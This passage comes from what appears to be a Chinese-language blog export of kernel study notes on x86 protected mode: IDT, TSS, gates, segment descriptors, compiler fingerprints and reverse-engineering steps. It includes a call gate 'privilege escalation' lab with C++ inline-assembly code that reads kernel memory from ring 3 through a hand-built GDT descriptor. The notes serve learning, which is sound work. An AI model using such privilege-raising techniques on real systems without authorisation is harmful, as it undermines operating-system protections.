调试</code></pre><p>IDT</p><pre><code>IDT即中断描述符表,同GDT一样，IDT也是由一系列描述符组成的，每个描述符占8个字节。但要注意的是，IDT表中的第一个元素不是NULL。在windbg中查看IDT表的基址和长度:</code></pre><p>老的CPU用的中断门，新的用的快速调用</p><p>IDT表都是系统段描述符，都不是空（调用门就有可能是代码数据段，和有空了）</p><p>中断门Type是1110，陷阱门是1111</p><h2 id="陷阱门与中断门的区别"><a href="#陷阱门与中断门的区别" class="headerlink" title="陷阱门与中断门的区别"></a>陷阱门与中断门的区别</h2><p>中断门执行时，将IF位清零,但陷阱门不会。</p><p>在调用门、中断门与陷阱门中，一旦出现权限切换，那么就会有堆栈的切换。而且，由于CS的CPL发生改变，也导致了SS也必须要切换。</p><pre><code>切换时，会有新的ESP和SS(CS是由中断门或者调用门指定)这2个值从哪里来的呢？答案：TSS (Task-state segment )，任务状态段.</code></pre><h2 id="TSS的结构"><a href="#TSS的结构" class="headerlink" title="TSS的结构"></a>TSS的结构</h2><p>TSS是一块内存，不是寄存器不在CPU中，内存结构如下图，大小104字节  </p><p><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/baohumoshi/8.png" alt="TSS的结构"></p><p>TSS的作用</p><pre><code>Intel的设计思想操作系统的设计思想本质：    不要把TSS与“任务切换”联系到一起    TSS的意义就在于可以同时换掉”一堆”寄存器</code></pre><p>CPU如何找到TSS呢?  TR段寄存器  </p><p><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/baohumoshi/9.png" alt="TR寄存器"></p><p>CPU找TSS直接在TR寄存器，TR的Base指向TSS，Limit是Tss有多大，TSS是操作系统启动时从GDT加载的。TSS是系统段的一种。所以S为是0，Type是1001，说明没有加载到TR寄存器中，1011时是已经加载到TR寄存器。  </p><h2 id="TR寄存器读写"><a href="#TR寄存器读写" class="headerlink" title="TR寄存器读写"></a>TR寄存器读写</h2><ol><li>将TSS段描述符加载到TR寄存器  <pre><code>指令：LTR  说明：用LTR指令去装载的话 仅仅是改变TR寄存器的值(96位) 并没有真正改变TSS  LTR指令只能在系统层使用加载后TSS段描述符会状态位会发生改变就是上面9变B</code></pre></li><li><p>读TR寄存器  </p><pre><code>1. 指令：STR  说明：如果用STR去读的话，只读了TR的16位 也就是选择子  </code></pre><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p> TSS是一块内存，大小104字节.通过TSS可以同时替换“一堆”寄存器，包括通用寄存器和段寄存器等.</p><p> CPU通过TR段寄存器来找到TSS.如果我们想用自己的TSS段来替换原来的寄存器，就要修改TR寄存器，TR寄存器的值又是来自TSS段描述符，那么我们接下来先构造一个段描述符。</p></li></ol><p>修改TR寄存器</p><pre><code>1) 在Ring0 我们可以通过LTR指令去修改TR寄存器2) 在Ring3 我们可以通过CALL FAR 或者 JMP FAR指令来修改</code></pre><p>用JMP去访问一个代码段的时候，改变的是CS和EIP ：</p><pre><code>JMP 0x48:0x123456  如果0x48是代码段  执行后：CS--&gt;0x48  EIP--&gt;0x123456</code></pre><p>用JMP去访问一个任务段的时候：</p><pre><code>如果0x48是TSS段描述符，先修改TR寄存器，在用TR.Base指向的TSS中的值修改当前的寄存器</code></pre><h1 id="任务门描述符"><a href="#任务门描述符" class="headerlink" title="任务门描述符"></a>任务门描述符</h1><p>Type为0101即5.<br><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/baohumoshi/10.png" alt="任务门"> </p><p>这是TSS段的描述符（在GDT表），任务门本身在IDT表</p><p>任务门执行过程：</p><p>INT N</p><p>查IDT表，找到中断门描述符</p><p>通过中断门描述符，查GDT表，找到任务段描述符</p><p>使用TSS段中的值修改寄存器</p><p>IRETD返回</p><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p>[1]：滴水视频</p>]]></content>
      
      <categories>
          
          <category> 笔记 - 内核笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 保护模式 </tag>
            
            <tag> 保护模式段 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>段使用时相关的检查与调用门实验</title>
      <link href="/2018/06/22/%E6%AE%B5%E4%BD%BF%E7%94%A8%E6%97%B6%E7%9B%B8%E5%85%B3%E7%9A%84%E6%A3%80%E6%9F%A5%E4%B8%8E%E8%B0%83%E7%94%A8%E9%97%A8%E5%AE%9E%E9%AA%8C/"/>
      <url>/2018/06/22/%E6%AE%B5%E4%BD%BF%E7%94%A8%E6%97%B6%E7%9B%B8%E5%85%B3%E7%9A%84%E6%A3%80%E6%9F%A5%E4%B8%8E%E8%B0%83%E7%94%A8%E9%97%A8%E5%AE%9E%E9%AA%8C/</url>
      <content type="html"><![CDATA[<h1 id="段类型检查"><a href="#段类型检查" class="headerlink" title="段类型检查"></a>段类型检查</h1><p>加载段选择符进入段寄存器时候</p><ul><li>CS只能存放可执行的选择符</li><li>不可读可执行不能被加载到数据段寄存器</li><li>只有可写的数据段才能加载到SS</li></ul><h1 id="段权限检查"><a href="#段权限检查" class="headerlink" title="段权限检查"></a>段权限检查</h1><p>当给段寄存器赋值，实际是从GDT中获取相应的段描述符加载到段寄存器的不可见部分。这个时候有个权限检查，有三个概念：</p><ul><li>CPL：当前代码执行权限</li><li>DPL：存在段描述符中，描述访问本段内存需要的权限</li><li>RPL：存在于段寄存器加载时的段选择子中，描述了使用什么样的权限对目标进行访问</li></ul><p>从数值上MAX（CPL，RPL）&lt;DPL.  </p><p>段内跳转不会产生权限检查（JMP，CALL，RET），段间会。 </p><p>当S为0时：</p><ul><li>调用门：Type=12。</li><li>中断门：Type=14。</li><li>陷阱门：Type=15。</li><li>任务门：Type=5。</li></ul><h1 id="调用门"><a href="#调用门" class="headerlink" title="调用门"></a>调用门</h1><p><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/duanshiyongjiancha/1.png" alt="调用门图片"><br>调用门描述符中存储了一个代码段的段选择子。<br>指令格式：CALL CS：EIP（EIP废弃的）</p><ul><li>根据CS的值查GDT表，找到对应段描述符，之歌描述符是一个调用门。</li><li>在调用门描述符中存储着另一个代码段的段选择子。</li><li>选择子指向的段，段Base+偏移地址，就是真正要执行的地址。<br>通过调用门可以原图，不过Windows并没有用调用门。 </li></ul><p>段寄存器一共有 96 位，其中16可见部分来源于段选择子的索引部分。剩下80位来源于 GDT表。++<strong>那GDT表64位是怎么表示80位的段描述符呢？</strong>++ 是有一部分是G位为零代表粒度是1字节，在段限长前面补12位000，如果G为1在段限长前面补FFF，FFF刚好4KB。（段限长就是FFFFF）,所以当G=0，即粒度是1B时候，范围就是<br>2^00000000^到2^000FFFFF^即1B到4MB,当G=1，即粒度是1B时候，范围就是2^FFF00000^到2^FFFFFFFF^，即4KB到4GB。</p><h1 id="中断门和陷阱门"><a href="#中断门和陷阱门" class="headerlink" title="中断门和陷阱门"></a>中断门和陷阱门</h1><p>除了GDT外，还有一个地方也存着门描述符，被称为IDT（中断描述符表）。<br>IDT中存着3种门描述符： </p><ul><li>中断门描述符 </li><li>陷阱门描述符</li><li>任务门描述符 </li></ul><p>当S为0，type为1110是个中断门<br>中断门描述符存储着一个断码段选择子。<br>当S为0，type为1111是陷阱门 </p><ul><li>陷阱门用于存放异常处理函数</li><li>中断门用于存放中断处理函数地址</li><li>中断门执行时候IF位会清零，屏蔽可屏蔽中断，陷阱门不会。 </li></ul><h1 id="调用门提权实验"><a href="#调用门提权实验" class="headerlink" title="调用门提权实验"></a>调用门提权实验</h1><p>先确定一个事情，怎么提权？是要构造一个调用门描述符，然后CALL这个段的一个地址所以这个段的DPL得是3环的，所以，在构造的调用门描述符里，DPL位是3即11b，即3环就能访问本段的程序。然后这个调用门里的段选择子（就是13位可见的那部分个）是要执行的段，所以他的段选择子的RPL要是高权限，所以他的RPL应该是00，Ti也0，查GDT第二个就行所以索引是1，所以合起来是1000b，所以段选择子是8，所以要构造的调用门描述符里8，的作用是让其RPL是00为0，环以0环权限去访问，Ti为是0找GDT表，其他位置弄成如下<br>XXXXEC000008XXXX<br>下面的代码相关信息如下</p><ul><li>前后XXXX为偏移，比如你要执行的代码的偏移，即下文函数的入口，构造下面代码</li><li>0x80b95500为任意一个内核空间（高地址空间），为了验证能不能提权，得到内核的信息。</li><li>retf为不仅像ret一样pop ip，还pop cs</li><li>0x00,0x00,0x00,0x00,0x63,0x00 为CS：IP，因为内存以小端寸断存储。所以是这样，IP可以任意</li><li>fword为远跳，6字节的，用于段间跳转。</li><li>CS为0x63，即下面代码要CALL的段选择是0x63，是因为我们找了一个GDT里的空位为第12个位置，所以是1100,然后找GDT，权限是3环，所以段选择子是1100011b，所以这个是63</li><li>注意vs要关闭随机基址，虚拟机要单核，比较好做这个实验</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> g_num = <span class="number">0</span>;</span><br><span class="line">_declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//这里如果用了 int 3 那么回到3环的时候，会造成程序崩溃，因为回去的时候，FS会被置0；</span></span><br><span class="line">_asm &#123;</span><br><span class="line">push eax;</span><br><span class="line">mov eax, DWORD ptr ds : [<span class="number">0x80b95500</span>];</span><br><span class="line">mov g_num, eax;</span><br><span class="line">pop eax;</span><br><span class="line">retf;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">6</span>] = &#123; <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x63</span>,<span class="number">0x00</span> &#125;;</span><br><span class="line">_asm &#123;</span><br><span class="line">call fword ptr ds : [buf];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%x"</span>, g_num);</span><br><span class="line">system(<span class="string">"pause"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p>[1]：赵炯，《Linux内核完全剖析》，机械工业出版社. 4.3.4节<br>[2]:<code>https://blog.csdn.net/q1007729991/article/details/52538080</code><br>[3]：李忠，《x86汇编语言:从实模式到保护模式》，电子工业出版社</p>]]></content>
      
      <categories>
          
          <category> 笔记 - 内核笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 保护模式 </tag>
            
            <tag> 调用门 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>段描述符浅谈</title>
      <link href="/2018/06/21/%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6%E6%B5%85%E8%B0%88/"/>
      <url>/2018/06/21/%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6%E6%B5%85%E8%B0%88/</url>
      <content type="html"><![CDATA[<h1 id="描述符表中存放的是段描述符，如下图所示"><a href="#描述符表中存放的是段描述符，如下图所示" class="headerlink" title="描述符表中存放的是段描述符，如下图所示"></a>描述符表中存放的是段描述符，如下图所示</h1><p><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/DuanMiaoShuFu/2.PNG" alt="图1-1 段描述符通用格式"></p><h1 id="段描述符基本属性"><a href="#段描述符基本属性" class="headerlink" title="段描述符基本属性"></a>段描述符基本属性</h1><p>段描述符是GDT和LDT中的一个数据结构项，用于向处理器提供有关一个段的位置大小访问控制的信息状态信息，每个段描述符的长度是8个字节，含有3个主要字段</p><ul><li>段基地址</li><li>段限长</li><li>段属性 </li></ul><h2 id="基地址字段Base"><a href="#基地址字段Base" class="headerlink" title="基地址字段Base"></a>基地址字段Base</h2><p>描述了一个短的起始位置，由三个部分组成一共32位，段基地址可以是0~4GB范围内的任意地址(这同实模式不同，实模式下段基地址要求16字节对齐)，但是为了让程序具有最佳性能，还是建议16字节对齐。</p><h2 id="粒度G位"><a href="#粒度G位" class="headerlink" title="粒度G位"></a>粒度G位</h2><p>为0，Limit单位是字节。为1，Limit单位是4KB。</p><h2 id="B-D位-数据段时是B，代码段时是D"><a href="#B-D位-数据段时是B，代码段时是D" class="headerlink" title="B/D位 (数据段时是B，代码段时是D)"></a>B/D位 (数据段时是B，代码段时是D)</h2><ul><li>为B时<ul><li>为0，内存寻址是16位，堆栈使用SP，段的最大大小是64KB。</li><li>为1，内存寻址是32位，堆栈使用ESP，段的最大大小是4GB。</li></ul></li><li>为D时<ul><li>为0，默认值是16位的地址和16位或者8为操作数。</li><li>为1，默认值是32位的地址和32位或者8为操作数。<h2 id="L位（21）"><a href="#L位（21）" class="headerlink" title="L位（21）"></a>L位（21）</h2>是64位代码段标志，保留给64位处理器使用，目前在分析32位时置零即可<h2 id="AVL"><a href="#AVL" class="headerlink" title="AVL"></a>AVL</h2>是软件可以使用的位，通常由操作系统使用，处理器不使用它<h2 id="段限长Limit"><a href="#段限长Limit" class="headerlink" title="段限长Limit"></a>段限长Limit</h2>处理器会把段描述符中两个段限长字段组合成一个20位的值，并根据颗粒度标志G来知道段限长Limit值的实际含义。<h2 id="描述符有效位P位"><a href="#描述符有效位P位" class="headerlink" title="描述符有效位P位"></a>描述符有效位P位</h2>为1则段描述符有效，为0则段描述符无效<h2 id="DPL"><a href="#DPL" class="headerlink" title="DPL"></a>DPL</h2>存在于段描述符中，描述了访问本地内存需要的权限。<h2 id="S与TYPE"><a href="#S与TYPE" class="headerlink" title="S与TYPE"></a>S与TYPE</h2>应用程序有数据段和代码段，cpu还有系统段和门描述符，用来管理任务，异常，中断。并非所有的描述符都定义一个段，门描述符中存放着一个指向过程入口点的指针，S和Type字段表明了描述符的类型信息。</li></ul></li></ul><table><thead><tr><th>S位</th><th>Type域</th></tr></thead><tbody><tr><td>为1代码是一个代码段或者数据段，0是一个系统段</td><td>一共4位，在S位不同时，含义不同</td><td></td></tr></tbody></table><p>当S为1时，Tpye的四位，11位为0时是数据段，1时是代码段。</p><ul><li><p>当时数据段时，后面10,9,8位为EWA</p><ul><li>10号位为E扩展位，0向上扩展，1向下扩展，向上扩展就是正常的扩展，向上扩展一段空间，扩展的空间可用，向下扩展就是向上扩展一下，除了这段，其他的都在段内，如图<img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/DuanMiaoShuFu/1.png" alt="图1-2 向上扩展和向下扩展"></li><li>9号位为W，为是否可写（代码段可定都是可读的所以不需要这样的属性标志）</li><li>8号位为A，为是否已被访问</li></ul></li><li><p>当时代码段时，后面10,9,8位为CRA  </p><ul><li>10号位为一致性段位，0是非一致性段，1是一致性段  <ul><li><strong>非一致代码段：</strong>  受到隔离的代码，只能在同一级别间互相访问。</li><li><strong>一致性代码段：</strong>  不受隔离，允许被同等级货低等级代码调用。</li></ul></li><li>9号位为R，为是否可读（代码段都是可执行的）</li><li>8号位为A，为是否已被访问</li></ul></li></ul><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p>[1]：赵炯，《Linux内核完全剖析》，机械工业出版社. 4.3.4节</p>]]></content>
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 保护模式 </tag>
            
            <tag> 内核 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>MarkDown用法之表格单元格合并</title>
      <link href="/2018/06/21/MarkDown%E7%94%A8%E6%B3%95%E4%B9%8B%E8%A1%A8%E6%A0%BC%E5%8D%95%E5%85%83%E6%A0%BC%E5%90%88%E5%B9%B6/"/>
      <url>/2018/06/21/MarkDown%E7%94%A8%E6%B3%95%E4%B9%8B%E8%A1%A8%E6%A0%BC%E5%8D%95%E5%85%83%E6%A0%BC%E5%90%88%E5%B9%B6/</url>
      <content type="html"><![CDATA[<p>Markdown语法本身不包含复杂表格的插入，但是可以使用html语法来实现。</p><p>水平单元格的合并：基于colspan属性，即使一个单元格占多列的空间<br>纵向单元格的合并：基于rowspan属性，即使一个单元格占多行的空间<br>要想MarkDown中插入复杂表格时，可以先在word或excel中把表格写好，然后在如下网站进行转化为标记对形式：</p><p><a href="http://pressbin.com/tools/excel_to_html_table/index.html" target="_blank" rel="noopener">http://pressbin.com/tools/excel_to_html_table/index.html</a></p><p>然后删除空标记对，并设置colspan和rowspan属性即可。<br>比如  <code>&lt;td colspan=&quot;8&quot;&gt;基地址Base31到24&lt;/td&gt;</code>就是合并8列单元格</p>]]></content>
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MarkDown </tag>
            
            <tag> 文本编辑 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>程序二进制特征</title>
      <link href="/2018/06/20/%E7%A8%8B%E5%BA%8F%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%89%B9%E5%BE%81/"/>
      <url>/2018/06/20/%E7%A8%8B%E5%BA%8F%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%89%B9%E5%BE%81/</url>
      <content type="html"><![CDATA[<h1 id="常用程序的特征"><a href="#常用程序的特征" class="headerlink" title="常用程序的特征"></a>常用程序的特征</h1><h2 id="1-BC"><a href="#1-BC" class="headerlink" title="1.BC++"></a>1.BC++</h2><h2 id="2Delphi"><a href="#2Delphi" class="headerlink" title="2Delphi"></a>2Delphi</h2><h2 id="3易语言"><a href="#3易语言" class="headerlink" title="3易语言"></a>3易语言</h2><h2 id="4VB"><a href="#4VB" class="headerlink" title="4VB"></a>4VB</h2><h2 id="3VC"><a href="#3VC" class="headerlink" title="3VC++"></a>3VC++</h2><h1 id="分析BC-程序特征"><a href="#分析BC-程序特征" class="headerlink" title="分析BC++程序特征"></a>分析BC++程序特征</h1><p>OPE特征    EB 10  Fb c++hook<br>二进制特征：EB 10 66 62 3A 43 2B 2B 48 4F 4F 4B 90</p><p>第一个CALL内有API调用 GetMouduleHandleA</p><h1 id="分析Delphi程序特征"><a href="#分析Delphi程序特征" class="headerlink" title="分析Delphi程序特征"></a>分析Delphi程序特征</h1><p>OPE特征  5个Call ，上面全是地址，后面全是0，第一个CALL内有API调用 GetMouduleHandleA</p><p>调用函数时，跳转IAT时OPCODE跳转是FF25，VC是FF15</p><p>区段名比较细致</p><p>CODE，DATA，BSS（），idata，tls，rdata，reloc，rsrc</p><p>链接器版本<br>2.25</p><h1 id="分析VS程序"><a href="#分析VS程序" class="headerlink" title="分析VS程序"></a>分析VS程序</h1><p>VC6.0  6.0<br>VC2003 7.0 7.1<br>VC2005 8.0<br>VC2008   9.0<br>VS2010   10<br>VS2012   11<br>VS2015   14.0<br>VS2017  14.1  </p><h1 id="分析VC6-0和易语言程序特征"><a href="#分析VC6-0和易语言程序特征" class="headerlink" title="分析VC6.0和易语言程序特征"></a>分析VC6.0和易语言程序特征</h1><p>这两个编译器一样，链接器都是6.0版本，第一个api调用getversion，<br>Sub esp，0x58</p><h1 id="逆向步骤"><a href="#逆向步骤" class="headerlink" title="逆向步骤"></a>逆向步骤</h1><p>拿到程序  </p><h2 id="1-确定格式和加密"><a href="#1-确定格式和加密" class="headerlink" title="1.确定格式和加密"></a>1.确定格式和加密</h2><h2 id="2-根据分析，选择工具全面静态分析"><a href="#2-根据分析，选择工具全面静态分析" class="headerlink" title="2.根据分析，选择工具全面静态分析"></a>2.根据分析，选择工具全面静态分析</h2><p>1.查看链接器版本（4.20-VB5，2.25-Delphi7）<br>2.查看OEP代码，是否加壳，未加壳的编译器环境（代码是否正常，pushad这类不正常）<br>3.查看区段（.text 微软 CODE 宝蓝）<br>4.查看导入导出 表（函数名）<br>5.查看资源信息（有无自定义资源）<br>6.查看TLS信息息（有无设置TLS回调函数）<br>7.文件大小，图标  </p><h2 id="3-使用完PE工具，在使用其他工具进行分析"><a href="#3-使用完PE工具，在使用其他工具进行分析" class="headerlink" title="3.使用完PE工具，在使用其他工具进行分析"></a>3.使用完PE工具，在使用其他工具进行分析</h2><p>1.如果加壳，就脱壳，如果是强壳还是需要脱壳才能分析，那就先找OEP再转存到文件，结合IDA进行分析。<br>2.若果程序为保护，看引用了API之类的，根据API确定实现的功能，比如文件操作，网络操作，注册表操作。用监控类工具分析，分析日志，，再进行下一步分析，如果需要分析网络数据可以使用抓包工具。<br>3.如果其他的文件，如资源文件，分析字符串推测功能<br>4.如果程序有安装目录，目录每个文件子目录都要查看  </p><h2 id="4-根据静态分析情况，再动态分析"><a href="#4-根据静态分析情况，再动态分析" class="headerlink" title="4.根据静态分析情况，再动态分析"></a>4.根据静态分析情况，再动态分析</h2><p>第一种，单步跟踪调试，就是从程序加载开始跟踪，一直到找到需要的信息。<br>第二种，附加调试程序，这是在程序运行的状态下，附加进程，进行分析，一般在API下断，然后栈回溯进行分析，还有一种就是如果是窗口程序，我们可以通过窗口回调函数然后进行分析。  </p><h2 id="5-动静结合"><a href="#5-动静结合" class="headerlink" title="5.动静结合"></a>5.动静结合</h2><p>OD，IDA<br>如果分析中还是有很多困难，那么就需要使用IDA/OD等工具进行进一步的分析，尤其是字符串。<br>根据字符串，下断栈回溯分析。  </p><h2 id="6-使用源码对比法，辅助逆向"><a href="#6-使用源码对比法，辅助逆向" class="headerlink" title="6.使用源码对比法，辅助逆向"></a>6.使用源码对比法，辅助逆向</h2><p>分析程序，用了什么库，写代码demo反汇编我们的程序进行对比，提高逆向效率  </p>]]></content>
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 反汇编 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hello World</title>
      <link href="/2018/06/20/hello-world/"/>
      <url>/2018/06/20/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
    </entry>
    
  
  
</search>
